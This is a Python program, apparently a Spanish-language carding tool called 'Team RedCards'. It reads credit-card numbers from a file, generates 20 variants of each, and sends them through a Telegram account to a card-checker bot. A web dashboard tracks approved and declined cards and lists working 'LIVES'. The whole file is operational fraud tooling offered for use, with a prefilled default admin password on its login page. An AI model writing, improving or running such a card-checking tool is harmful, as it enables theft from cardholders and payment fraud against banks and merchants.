#!/usr/bin/env python3
"""
SCRAPPER TEAM REDCARDS v5.0 ELITE - FUNCIONAMIENTO COMPLETO
Estructura profesional con 5 capas - SIN ERRORES
"""

import threading
import asyncio
import os
import random
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, make_response
from telethon import TelegramClient
from telethon.errors import FloodWaitError, RPCError

from config import *
from database import db, lives_mgr, logger
from auth import login_user, logout_user, require_login
from utils import PasswordManager, CCGenerator

# ============ INICIALIZACIÓN ============
app = Flask(__name__)
app.secret_key = SECRET_KEY
client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

state = {
    'scraper_running': True,
    'processed_ccs': 0,
    'approved': 0,
    'declined': 0,
    'last_cc': None
}

def init_app():
    logger.add("🚀 Iniciando Scrapper Team RedCards v5.0 ELITE")
    from auth import initialize_default_admin
    initialize_default_admin()
    logger.add("✅ Sistema iniciado correctamente")

# ============ HTML LOGIN ============
HTML_LOGIN = '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>💳 Team RedCards</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 50px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
        .header { text-align: center; margin-bottom: 40px; }
        .logo { font-size: 60px; }
        h1 { color: #333; font-size: 28px; margin: 15px 0 10px; }
        .subtitle { color: #999; font-size: 13px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #666; font-weight: bold; margin-bottom: 8px; }
        input { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #764ba2; }
        .error { color: red; font-size: 12px; margin-top: 10px; padding: 10px; background: #ffe0e0; border-radius: 5px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">💳</div>
            <h1>Team RedCards</h1>
            <p class="subtitle">Acceso VIP v5.0 Elite</p>
        </div>
        <form id="form">
            <div class="form-group">
                <label>Usuario</label>
                <input type="text" id="user" value="admin" required>
            </div>
            <div class="form-group">
                <label>Contraseña</label>
                <input type="password" id="pass" value="ChangeMe123!@#" required>
            </div>
            <button type="submit">Acceder</button>
            <div id="err" class="error"></div>
        </form>
    </div>
    <script>
        document.getElementById('form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const err = document.getElementById('err');
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: document.getElementById('user').value,
                        password: document.getElementById('pass').value
                    })
                });
                const d = await r.json();
                if (r.ok) {
                    document.cookie = `session_token=${d.session_token}; path=/`;
                    window.location.href = '/dashboard';
                } else {
                    err.textContent = d.error;
                    err.style.display = 'block';
                }
            } catch (e) {
                err.textContent = 'Error de conexión';
                err.style.display = 'block';
            }
        });
    </script>
</body>
</html>
'''

HTML_DASHBOARD = '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #0f0f1e; color: #fff; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 15px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; }
        h1 { font-size: 32px; }
        .logout { background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .card { background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%); padding: 25px; border-radius: 15px; border-left: 4px solid #667eea; }
        .label { color: #999; font-size: 12px; }
        .value { font-size: 36px; font-weight: bold; color: #667eea; margin-top: 10px; }
        .section { background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%); padding: 25px; border-radius: 15px; margin-bottom: 20px; }
        .section h2 { color: #667eea; margin-bottom: 15px; }
        .item { background: rgba(102, 126, 234, 0.1); padding: 12px; border-radius: 8px; margin-bottom: 10px; border-left: 3px solid #27ae60; }
        .logs { max-height: 300px; overflow-y: auto; }
        .log { font-size: 11px; padding: 5px; border-bottom: 1px solid rgba(255,255,255,0.1); font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>💳 Dashboard</h1>
            <button class="logout" onclick="logout()">Salir</button>
        </div>

        <div class="grid">
            <div class="card">
                <div class="label">✅ Aprobadas</div>
                <div class="value" id="approved">0</div>
            </div>
            <div class="card">
                <div class="label">❌ Declinadas</div>
                <div class="value" id="declined">0</div>
            </div>
            <div class="card">
                <div class="label">🔄 Procesadas</div>
                <div class="value" id="processed">0</div>
            </div>
        </div>

        <div class="section">
            <h2>🔥 LIVES</h2>
            <div id="lives"></div>
        </div>

        <div class="section logs">
            <h2>📊 Logs</h2>
            <div id="logs"></div>
        </div>
    </div>

    <script>
        function refresh() {
            fetch('/api/stats').then(r => r.json()).then(d => {
                document.getElementById('approved').textContent = d.approved;
                document.getElementById('declined').textContent = d.declined;
                document.getElementById('processed').textContent = d.processed_ccs;
            });

            fetch('/api/lives').then(r => r.json()).then(d => {
                const html = d.lives.length > 0 
                    ? d.lives.map(l => `<div class="item">${l.cc}</div>`).join('')
                    : '<p style="color:#999">Sin LIVES</p>';
                document.getElementById('lives').innerHTML = html;
            });

            fetch('/api/logs').then(r => r.json()).then(d => {
                document.getElementById('logs').innerHTML = d.logs
                    .reverse().slice(0, 30)
                    .map(l => `<div class="log">${l}</div>`)
                    .join('');
            });
        }

        function logout() {
            fetch('/api/logout', { method: 'POST' });
            document.cookie = 'session_token=';
            window.location.href = '/';
        }

        refresh();
        setInterval(refresh, 3000);
    </script>
</body>
</html>
'''

# ============ RUTAS ============

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/dashboard')
@require_login
def dashboard():
    return render_template_string(HTML_DASHBOARD)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    result, error = login_user(data.get('username', ''), data.get('password', ''))
    if error:
        return jsonify({'error': error}), 401
    resp = make_response(jsonify({'success': True, 'session_token': result['session_token']}))
    resp.set_cookie('session_token', result['session_token'], max_age=86400)
    return resp

@app.route('/api/logout', methods=['POST'])
@require_login
def api_logout():
    token = request.cookies.get('session_token')
    logout_user(token)
    resp = make_response(jsonify({'success': True}))
    resp.set_cookie('session_token', '', max_age=0)
    return resp

@app.route('/api/stats')
@require_login
def api_stats():
    return jsonify(state)

@app.route('/api/lives')
@require_login
def api_lives():
    return jsonify({'lives': lives_mgr.get_recent_lives(10)})

@app.route('/api/logs')
@require_login
def api_logs():
    return jsonify({'logs': logger.get_recent(50)})

@app.route('/api/health')
def health():
    return jsonify({'status': 'ok'})

# ============ SCRAPER + TELETHON ============

async def scraper_worker(client):
    global state
    logger.add("🚀 Scraper iniciado")
    state['scraper_running'] = True

    while True:
        try:
            if not os.path.exists('ccs.txt'):
                await asyncio.sleep(15)
                continue

            with open('ccs.txt', 'r', encoding='utf-8') as f:
                ccs_list = [line.strip() for line in f if line.strip()]

            if not ccs_list:
                logger.add("⏳ Sin CCs en queue")
                await asyncio.sleep(20)
                continue

            cc = ccs_list[0]
            logger.add(f"🔄 Procesando: {cc[:15]}...")
            state['last_cc'] = cc

            variants, err = CCGenerator.generate_variants(cc, count=20)
            if err:
                logger.add(f"❌ Error: {err}")
                ccs_list.pop(0)
                with open('ccs.txt', 'w', encoding='utf-8') as f:
                    f.write('\n'.join(ccs_list) + '\n' if ccs_list else '')
                await asyncio.sleep(15)
                continue

            if os.path.exists('cmds.txt'):
                with open('cmds.txt', 'r', encoding='utf-8') as f:
                    cmds = [line.strip() for line in f if line.strip()]
            else:
                cmds = ['/check', '/validate', '/test']

            if not cmds:
                cmds = ['/check']

            logger.add(f"📤 Enviando 20 variantes...")

            for i, variant in enumerate(variants):
                try:
                    cmd = random.choice(cmds)
                    await client.send_message('@Alphachekerbot', f"{cmd} {variant}")
                    state['processed_ccs'] += 1
                    logger.add(f"✓ #{i+1}/20")
                    await asyncio.sleep(1.2)
                except FloodWaitError as e:
                    logger.add(f"⏸️ Esperando {e.seconds}s")
                    await asyncio.sleep(e.seconds + 1)
                except Exception as e:
                    logger.add(f"❌ Error: {str(e)[:50]}")
                    await asyncio.sleep(1)

            logger.add(f"✅ Lote completado")

            ccs_list.pop(0)
            with open('ccs.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(ccs_list) + '\n' if ccs_list else '')

            logger.add("⏳ Esperando 21 segundos...")
            await asyncio.sleep(21)

        except Exception as e:
            logger.add(f"❌ Error scraper: {str(e)[:80]}")
            await asyncio.sleep(20)

async def telegram_main(client):
    try:
        logger.add("📱 Conectando Telegram...")
        await client.start()
        logger.add("✅ Telegram listo")
        await scraper_worker(client)
    except Exception as e:
        logger.add(f"❌ Telegram error: {str(e)[:80]}")

def thread_telegram():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(telegram_main(client))

if __name__ == '__main__':
    init_app()
    t = threading.Thread(target=thread_telegram, daemon=True)
    t.start()
    logger.add(f"🚀 Servidor en puerto {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
